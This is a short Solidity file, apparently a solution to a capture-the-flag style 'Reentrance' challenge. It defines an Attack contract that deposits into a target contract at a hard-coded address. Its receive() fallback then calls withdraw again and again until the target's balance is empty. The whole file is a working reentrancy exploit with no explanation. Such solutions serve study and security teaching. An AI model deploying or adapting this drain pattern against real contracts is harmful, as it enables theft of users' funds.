pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    Reentrance pwn = Reentrance(0xe08830755E04e52ce5E62a11ea4a4E81b2530E71);

    constructor() public payable {}

    function Deposit() public {
        pwn.donate.value(address(this).balance)(address(this));
    }

    function Withdraw() public {
        pwn.withdraw(pwn.balances(address(this)));
    }

    receive() external payable {
        if (address(pwn).balance != 0) {
            pwn.withdraw(pwn.balances(address(this)));
        }
    }
}
